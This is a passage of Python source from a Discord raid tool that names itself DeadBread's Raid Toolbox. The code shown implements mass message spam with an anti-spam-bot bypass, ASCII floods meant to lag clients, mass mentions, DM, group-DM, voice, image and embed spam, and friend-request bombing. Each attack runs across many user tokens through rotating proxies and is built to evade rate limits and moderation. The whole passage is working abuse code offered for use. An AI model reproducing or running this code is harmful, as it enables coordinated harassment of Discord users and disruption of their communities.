                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": False}
                    for m in [text[i:i+1999] for i in range(0, len(text), 1999)]:
                        while True:
                            try:
                                time.sleep(int(float(speed)))
                                src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                            except Exception:
                                if use_proxies == 1:
                                    proxies = request_new_proxy()
                                else:
                                    break
                            else:
                                break
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])
                            sys.exit()
                        elif src.status_code == 403:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])
        else:
            if channel == 'all':
                while True:
                    try:
                        chanjson = request.get(f"https://{endpoint}discord.com/api/v8/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
                    except Exception:
                        if use_proxies == 1:
                            proxies = request_new_proxy()
                        else:
                            break
                    else:
                        break
                channellist = json.loads(chanjson.content)
                original = text
                while True:
                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": False}
                    for channel in channellist:
                        if not channel['type'] == 0:
                            continue
                        else:
                            while True:
                                try:
                                    time.sleep(int(float(speed)))
                                    src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                                except Exception:
                                    if use_proxies == 1:
                                        proxies = request_new_proxy()
                                    else:
                                        break
                                else:
                                    break
                            if src.status_code == 429:
                                ratelimit = json.loads(src.content)
                                time.sleep(float(ratelimit['retry_after']/1000))
                            elif src.status_code == 401:
                                error = json.loads(src.content)
                                write_error(token, error['message'], error['code'])
                                sys.exit()
                            elif src.status_code == 404:
                                error = json.loads(src.content)
                                write_error(token, error['message'], error['code'])
                                sys.exit()
                            elif src.status_code == 403:
                                error = json.loads(src.content)
                                write_error(token, error['message'], error['code'])

            else:
                original = text
                while True:
                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": False}
                    while True:
                        try:
                            time.sleep(int(float(speed)))
                            src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                        except Exception:
                            if use_proxies == 1:
                                proxies = request_new_proxy()
                            else:
                                break
                        else:
                            break
                    if src.status_code == 429:
                        ratelimit = json.loads(src.content)
                        time.sleep(float(ratelimit['retry_after']/1000))
                    elif src.status_code == 401:
                        error = json.loads(src.content)
                        write_error(token, error['message'], error['code'])
                        sys.exit()
                    elif src.status_code == 404:
                        error = json.loads(src.content)
                        write_error(token, error['message'], error['code'])
                        sys.exit()
                    elif src.status_code == 403:
                        error = json.loads(src.content)
                        write_error(token, error['message'], error['code'])

    if command_line_mode == 0:
        layout = [
            [sg.Text('Text To Spam', size=(15, 1)), sg.Input(key="Text")],
            [sg.Text('Channel ID', size=(15, 1)), sg.Input('all', key="ChannelID")],
            [sg.Text('Server ID', size=(15, 1)), sg.Input(key="Server")],
            [sg.Button('Start',button_color=theme['button_colour'],size=(10,1)),sg.Checkbox("Append Emoji Spam",tooltip="Add Emoji Spam to message, message can be empty.", key="SpamEmoji"), sg.Checkbox("Anti-Spam Bypass",tooltip="Attempts to bypass anti-spam bots", key="Bypass"), sg.Text("Interval"), sg.Combo(['0','.7','1','2','3','5'], tooltip="How long to wait between messages.", key="speed", default_value="0")]
        ]
        window = sg.Window('RTB | Message Spammer', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        text = values["Text"]
        channelid = values["ChannelID"]
        SERVER = values["Server"]
        emojispam = values["SpamEmoji"]
        bypass = values["Bypass"]
        speed = values["speed"]
    else:
        text = sys.argv[6]
        channelid = sys.argv[7]
        SERVER = sys.argv[8]
        emojispam = False
        bypass = False
    for token in tokenlist:
        executor.submit(sendmessage, token, text, channelid, SERVER, emojispam, bypass, speed)

elif mode == 'asciispam':
    def sendascii(token,channel,server):
        headers, proxies = setup_request(token)
        request = requests.Session()
        if channel == 'all':
            while True:
                try:
                    src = request.get(f"https://{endpoint}discord.com/api/v8/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            if src.status_code == 401:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 403:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            channellist = json.loads(src.content)
            while True:
                for channel in channellist:
                    payload = {"content": asciigen(1999), "tts": False}
                    if not channel['type'] == 0:
                        continue
                    else:
                        while True:
                            try:
                                src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                            except Exception:
                                if use_proxies == 1:
                                    proxies = request_new_proxy()
                                else:
                                    break
                            else:
                                break
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])
                            sys.exit()
                        elif src.status_code == 403:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])

        else:
            while True:
                payload = {"content": asciigen(1999), "tts": False}
                while True:
                    try:
                        src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                    except Exception:
                        if use_proxies == 1:
                            proxies = request_new_proxy()
                        else:
                            break
                    else:
                        break
                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    time.sleep(float(ratelimit['retry_after']/1000))
                elif src.status_code == 401:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 403:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
    if command_line_mode == 0:
        layout = [
            [sg.Text('WARNING: This will make your Discord client lag by just looking at the channel,\nI recommend not looking at the channels while doing this attack.')],
            [sg.Text('Channel ID', size=(15, 1)), sg.Input('all', key="Channel")],
            [sg.Text('Server ID', size=(15, 1)), sg.Input(key="Server")],
            [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
        ]
        window = sg.Window('RTB | Ascii Spammer', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channelid = values["Channel"]
        SERVER = values["Server"]
    else:
        channelid = sys.argv[6]
        SERVER = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendascii, token, channelid, SERVER)

elif mode == 'massmention':
    def sendmention(token,channel,server):
        headers, proxies = setup_request(token)
        request = requests.Session()
        memberlist = []
        msg = ''
        while True:
            try:
                src = request.get(f"https://{endpoint}discord.com/api/v8/guilds/{server}/members?limit=1000",headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        if src.status_code == 401:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 404:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 403:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        memberjson = json.loads(src.content)
        for member in memberjson:
            memberlist.append(f"<@{member['user']['id']}>")
        for member in memberlist:
            msg += member + ' '
        if channel == 'all':
            while True:
                try:
                    src = request.get(f"https://{endpoint}discord.com/api/v8/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            if src.status_code == 401:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 403:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            channellist = json.loads(src.content)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                            payload = {"content" : m, "tts" : False}
                            while True:
                                try:
                                    src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                                except Exception:
                                    if use_proxies == 1:
                                        proxies = request_new_proxy()
                                    else:
                                        break
                                else:
                                    break
                            if src.status_code == 429:
                                ratelimit = json.loads(src.content)
                                time.sleep(float(ratelimit['retry_after']/1000))
                            elif src.status_code == 401:
                                error = json.loads(src.content)
                                write_error(token, error['message'], error['code'])
                                sys.exit()
                            elif src.status_code == 404:
                                error = json.loads(src.content)
                                write_error(token, error['message'], error['code'])
                                sys.exit()
                            elif src.status_code == 403:
                                error = json.loads(src.content)
                                write_error(token, error['message'], error['code'])
        else:
            while True:
                for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                    payload = {"content": m, "tts": False}
                    while True:
                        try:
                            src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                        except Exception:
                            if use_proxies == 1:
                                proxies = request_new_proxy()
                            else:
                                break
                        else:
                            break
                    if src.status_code == 429:
                        ratelimit = json.loads(src.content)
                        time.sleep(float(ratelimit['retry_after']/1000))
                    elif src.status_code == 401:
                        error = json.loads(src.content)
                        write_error(token, error['message'], error['code'])
                        sys.exit()
                    elif src.status_code == 404:
                        error = json.loads(src.content)
                        write_error(token, error['message'], error['code'])
                        sys.exit()
                    elif src.status_code == 403:
                        error = json.loads(src.content)
                        write_error(token, error['message'], error['code'])
    if command_line_mode == 0:
        layout = [
            [sg.Text('Server ID', size=(15, 1)), sg.Input(key="Server")],
            [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all', key="Channel")],
            [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
        ]
        window = sg.Window('RTB | Mass Mentioner', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        SERVER = values["Server"]
        channelid = values["Channel"]
    else:
        SERVER = sys.argv[6]
        channelid = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendmention, token, channelid, SERVER)

elif mode == 'vcspam':
    import youtube_dl
    ydl_opts = {
        'outtmpl': 'RTBFiles/vcspammercache/file.webm',
        'format': 'bestaudio/best',
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'wav',
            'preferredquality': '192',
        }],
    }
    if command_line_mode == 0:
        layout = [
            [sg.Text('YouTube Link to play', size=(15, 1)), sg.Input(key="Link")],
            [sg.Text('Voice Channel ID', size=(15, 1)), sg.Input(key="Channel")],
            [sg.Text('Ammount of Tokens', size=(15, 1)), sg.Slider(range=(1,len(tokenlist)), key="Count", default_value=len(tokenlist), size=(29,15), orientation='horizontal', font=('Helvetica', 10), text_color=(theme['slider_text_color']))],
            [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
        ]
        window = sg.Window('RTB | Voice Chat Spammer', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        ytlink = values["Link"]
        channelid = values["Channel"]
        ammount = values["Count"]
    else:
        ytlink = sys.argv[6]
        channelid = sys.argv[7]
        ammount = sys.argv[8]
    if not os.path.isdir('RTBFiles/vcspammercache/'):
        os.mkdir("RTBFiles/vcspammercache/")
    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        info_dict = ydl.extract_info(ytlink, download=False)
        video_id = info_dict.get("id", None)
    if not os.path.isfile(f'RTBFiles/vcspammercache/{video_id}.wav'):
        ydl_opts = {
            'outtmpl': f'RTBFiles/vcspammercache/{video_id}.webm',
            'format': 'bestaudio/best',
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'wav',
                'preferredquality': '192',
            }],
        }
        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
            ydl.download([ytlink])
    count = 0
    for token in tokenlist:
        count += 1
        subprocess.Popen([python_command, 'RTBFiles/vcspam.py', token, channelid, f'RTBFiles/vcspammercache/{video_id}.wav', str(os.getpid())], stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        if count == int(ammount):
            break
    while True:
        pass

elif mode == 'dmspammer':
    def dmspammer(token, userid, text, ascii):
        headers, proxies = setup_request(token)
        request = requests.Session()
        payload = {'recipient_id': userid}
        src = request.post('https://'+endpoint+'discord.com/api/v8/users/@me/channels', headers=headers, json=payload, proxies=proxies, timeout=10)
        dm_json = json.loads(src.content)
        if ascii:
            payload = {"content": asciigen(1999), "tts": False}
        else:
            payload = {"content": text, "tts": False}
        while True:
            while True:
                try:
                    src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{dm_json['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            if src.status_code == 429:
                ratelimit = json.loads(src.content)
                time.sleep(float(ratelimit['retry_after']/1000))
            elif src.status_code == 401:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 403:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
    if command_line_mode == 0:
        layout = [
            [sg.Text('Note: The tokens need to share a mutual server with the target for this to work.')],
            [sg.Text('Users ID', size=(15, 1)), sg.Input(key="UserID")],
            [sg.Text('Text to spam', size=(15, 1)), sg.Input(key="SpamText"), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.', key="Ascii")],
            [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
        ]
        window = sg.Window('RTB | DM Spammer', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        userid = values["UserID"]
        text = values["SpamText"]
        ascii = values["Ascii"]
    else:
        userid = sys.argv[6]
        text = sys.argv[7]
        if text == "ascii":
            ascii = True
        else:
            ascii = False
    for token in tokenlist:
        executor.submit(dmspammer, token, userid, text, ascii)

elif mode == 'friender':
    def friend(token, userid):
        headers, proxies = setup_request(token)
        request = requests.Session()
        while True:
            try:
                if "#" in userid:
                    user = userid.split("#")
                    payload = {"username": user[0], "discriminator": user[1]}
                    src = request.post('https://'+endpoint+'discord.com/api/v8/users/@me/relationships', headers=headers,json=payload, proxies=proxies, timeout=10)
                else:
                    src = request.put(f'https://{endpoint}discord.com/api/v8/users/@me/relationships/{userid}', headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        if src.status_code == 401:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 404:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 403:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
    if command_line_mode == 0:
        layout = [
            [sg.Text('Enter A User ID or Name + Tag')],
            [sg.Input(key="User")],
            [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
        ]
        window = sg.Window('RTB | Friend Bomber', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        userid = values["User"]
    else:
        userid = sys.argv[6]
    for token in tokenlist:
        executor.submit(friend, token, userid)

elif mode == 'groupdmspam':
    def sendgdm(token, text, group, ascii):
        headers, proxies = setup_request(token)
        request = requests.Session()
        payload = {"content": text, "tts": False}
        while True:
            if ascii:
                payload = {"content": asciigen(1999), "tts": False}
            while True:
                try:
                    src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{group}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            if src.status_code == 429:
                ratelimit = json.loads(src.content)
                time.sleep(float(ratelimit['retry_after']/1000))
            elif src.status_code == 401:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 403:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
    if command_line_mode == 0:
        layout = [
            [sg.Text('Text To Spam', size=(15, 1)), sg.Input(key="Text"), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.', key="Ascii")],
            [sg.Text('Group ID', size=(15, 1)), sg.Input(key="GroupID")],
            [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
        ]
        window = sg.Window('RTB | Group DM Spammer', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        text = values["Text"]
        group = values["GroupID"]
        ascii = values["Ascii"]
    else:
        text = sys.argv[6]
        group = sys.argv[7]
        if text == "ascii":
            ascii = True
        else:
            ascii = False
    for token in tokenlist:
        executor.submit(sendgdm, token, text, group, ascii)

elif mode == 'imagespam':
    def sendimages(token, channel, server, folder, text):
        headers, proxies = setup_request(token)
        request = requests.Session()
        del headers['Content-Type']
        if channel == 'all':
            while True:
                try:
                    src = request.get(f"https://{endpoint}discord.com/api/v8/guilds/{server}/channels", headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            print(src.text)
            channellist = json.loads(src.content)
            while True:
                for channel in channellist:
                    file = random.choice(os.listdir(folder))
                    img = f"{folder}/{file}"
                    files = {"file": open(img, 'rb')}
                    if text.lower() == "ascii":
                        files['payload_json'] = (None, json.dumps({'content': asciigen(1999)}))
                    else:
                        files['payload_json'] = (None, json.dumps({'content': text}))
                    if not channel['type'] == 0:
                        continue
                    else:
                        while True:
                            try:
                                src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, files=files, proxies=proxies, timeout=20)
                                print(src.text)
                            except Exception:
                                if use_proxies == 1:
                                    proxies = request_new_proxy()
                                else:
                                    break
                            else:
                                break
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])
                            sys.exit()
                        elif src.status_code == 403:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])
        else:
            while True:
                file = random.choice(os.listdir(folder))
                img = f"{folder}/{file}"
                files = {"file": open(img, 'rb')}
                if text.lower() == "ascii":
                    files['payload_json'] = (None, json.dumps({'content': asciigen(1999)}))
                else:
                    files['payload_json'] = (None, json.dumps({'content': text}))
                while True:
                    try:
                        src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, files=files, proxies=proxies, timeout=20)
                        print(src.text)
                    except Exception as e:
                        print(e)
                        if use_proxies == 1:
                            proxies = request_new_proxy()
                        else:
                            break
                    else:
                        break
                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    time.sleep(float(ratelimit['retry_after']/1000))
                elif src.status_code == 401:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 403:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
    if command_line_mode == 0:
        layout = [
            [sg.Text('Message Content', size=(15, 1)), sg.Input("ascii", key="Text", tooltip="Leave as 'ascii' to spam ASCII text")],
            [sg.Text('Folder Path', size=(15, 1)), sg.Input(key="FolderPath"),sg.FolderBrowse()],
            [sg.Text('Channel ID', size=(15, 1)), sg.Input('all', key="ChannelID")],
            [sg.Text('Server ID', size=(15, 1)), sg.Input(key="ServerID")],
            [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
        ]
        window = sg.Window('RTB | Random Image Spammer', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        folderpath = values["FolderPath"]
        channelid = values["ChannelID"]
        SERVER = values["ServerID"]
        text = values["Text"]
    else:
        print("Not Supported on CLI Mode.")
        input()
        sys.exit()
    for token in tokenlist:
        executor.submit(sendimages, token, channelid, SERVER, folderpath, text)

elif mode == 'gamechange':
    if use_proxies == 1:
        sg.Popup("This attack does not use proxies. This will use your own IP.", title="Caution.")
    import websocket
    def changegame(token, game, type, status):
        ws = websocket.WebSocket()
        if status == "random":
            stat = ['online', 'dnd', 'idle']
            status = random.choice(stat)
        ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
        hello = json.loads(ws.recv())
        heartbeat_interval = hello['d']['heartbeat_interval']
        if type == "Playing":
            gamejson = {
                "name": game,
                "type": 0
            }
        elif type == 'Streaming':
            gamejson = {
                "name": game,
                "type": 1,
                "url": "https://www.twitch.tv/DEADBREAD'S_RAID_TOOLBOX"
            }
        elif type == "Listening to":
            gamejson = {
                "name": game,
                "type": 2
            }
        elif type == "Watching":
            gamejson = {
                "name": game,
                "type": 3
            }
        auth = {
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": sys.platform,
                    "$browser": "RTB",
                    "$device": f"{sys.platform} Device"
                },
                "presence": {
                    "game": gamejson,
                    "status": status,
                    "since": 0,
                    "afk": False
                }
            },
            "s": None,
            "t": None
            }
        ws.send(json.dumps(auth))
        ack = {
                "op": 1,
                "d": None
            }
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps(ack))
            except Exception:
                break

    if command_line_mode == 0:
        layout = [
            [sg.Combo(['Playing', 'Streaming', 'Watching', 'Listening to'], size=(10, 1), default_value='Playing', readonly=True, key="Type"), sg.InputText('osu!',size=(10, 1), key="Activity"),sg.Combo(['online', 'dnd', 'idle','random'], size=(10, 1), default_value='online', readonly=True, key="Status")],
            [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
        ]
        window = sg.Window('RTB | Status Changer', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        type = values["Type"]
        game = values["Activity"]
        status = values["Status"]
    else:
        type = 'Playing'
        game = sys.argv[6]
        status = 'online'
    for token in tokenlist:
        executor.submit(changegame, token, game, type, status)

elif mode == 'nickname':
    def nickname(token,server,name,type):
        headers, proxies = setup_request(token)
        request = requests.Session()
        if type == "Cycle":
            n = []
            for x in name.rstrip():
                n.append(x)
            cyclename = cycle(n)
            newnick = ''
            while True:
                if len(newnick) == len(name.rstrip()):
                    newnick = ''
                newnick += next(cyclename)
                payload = {'nick': newnick}
                while True:
                    try:
                        src = request.patch(f'https://{endpoint}discord.com/api/v8/guilds/{server}/members/@me/nick', headers=headers, json=payload, proxies=proxies, timeout=10)
                    except Exception:
                        if use_proxies == 1:
                            proxies = request_new_proxy()
                        else:
                            break
                    else:
                        break
                if src.status_code == 429:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 401:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 403:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                time.sleep(1)
        elif type == "Ascii":
            while True:
                payload = {'nick': asciigen(32)}
                while True:
                    try:
                        src = request.patch(f'https://{endpoint}discord.com/api/v8/guilds/{server}/members/@me/nick', headers=headers, json=payload, proxies=proxies, timeout=10)
                    except Exception:
                        if use_proxies == 1:
                            proxies = request_new_proxy()
                        else:
                            break
                    else:
                        break
                if src.status_code == 429:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 401:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 403:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                time.sleep(2)
        elif type == "Set":
            payload = {'nick': name}
            while True:
                try:
                    src = request.patch(f'https://{endpoint}discord.com/api/v8/guilds/{server}/members/@me/nick', headers=headers, json=payload, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            if src.status_code == 429:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 401:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 403:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
    if command_line_mode == 0:
        layout = [
            [sg.Text('Server ID', size=(15, 1)), sg.Input(key="Server")],
            [sg.Combo(['Cycle','Ascii','Set'], size=(14, 5), default_value='Cycle', readonly=True, key="Type"), sg.Input("DeadBread's Raid Toolbox", tooltip="New Nickname", key="Nick")],
            [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
        ]
        window = sg.Window('RTB | Nickname Changer', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        server = values["Server"]
        type = values["Type"]
        name = values["Nick"]
    else:
        server = sys.argv[6]
        type = "Ascii"
        name = "None"
    for token in tokenlist:
        executor.submit(nickname,token,server,name,type)

elif mode == 'embed':
    def embedspam(token, channel, server, title, author, iconurl, field_name, field_value, imgurl, footer):
        headers, proxies = setup_request(token)
        request = requests.Session()
        payload = {
            "content": '',
            "embed": {
                "title": title,
                "color": random.randint(1,16777215),
                "footer": {
                    "icon_url": iconurl,
                    "text": footer
                },
                "image": {
                    "url": imgurl
                },
                "author": {
                    "name": author,
                    "url": "https://github.com/DeadBread76/Raid-Toolbox",
                    "icon_url": iconurl
                },
                "fields": [
                    {
                    "name": field_name,
                    "value": field_value
                    }
                ]
            }
        }
        if channel == 'all':
            while True:
                try:
                    chanjson = request.get(f"https://{endpoint}discord.com/api/v8/guilds/{server}/channels", headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        while True:
                            try:
                                src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                            except Exception:
                                if use_proxies == 1:
                                    proxies = request_new_proxy()
                                else:
                                    break
                            else:
                                break
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])
                            sys.exit()
                        elif src.status_code == 403:
                            error = json.loads(src.content)
                            write_error(token, error['message'], error['code'])
        else:
            while True:
                while True:
                    try:
                        src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                    except Exception:
                        if use_proxies == 1:
                            proxies = request_new_proxy()
                        else:
                            break
                    else:
                        break
                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    time.sleep(float(ratelimit['retry_after']/1000))
                elif src.status_code == 401:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 403:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
    layout = [
        [sg.Text('Server ID', size=(10, 1)), sg.Input(key="ServerID")],
        [sg.Text('Channel ID', size=(10, 1)), sg.Input('all', key="ChannelID")],
        [sg.Text('Title', size=(10, 1)), sg.Input(key="Title")],
        [sg.Text('Author', size=(10, 1)), sg.Input(key="Author")],
        [sg.Text('Icon URL', size=(10, 1)), sg.Input(key="IconURL")],
        [sg.Text('Field Name', size=(10, 1)), sg.Input(key="FieldName")],
        [sg.Text('Field Value', size=(10, 1)), sg.Input(key="FieldValue")],
        [sg.Text('Image URL', size=(10, 1)), sg.Input(key="ImageURL")],
        [sg.Text('Footer Text', size=(10, 1)), sg.Input(key="FooterText")],
        [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
    ]
